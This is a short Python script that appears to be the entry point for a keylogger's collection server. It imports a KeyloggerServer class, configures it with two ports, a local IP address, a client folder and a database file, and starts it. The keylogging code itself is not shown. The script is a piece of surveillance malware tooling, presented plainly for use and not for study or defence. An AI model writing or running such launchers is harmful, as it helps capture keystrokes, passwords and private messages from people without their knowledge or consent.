from keylogger_server import KeyloggerServer



call = KeyloggerServer(5001, 5002, "192.168.1.209", "ClientFolder", "clientDatabase.db")
call.start()

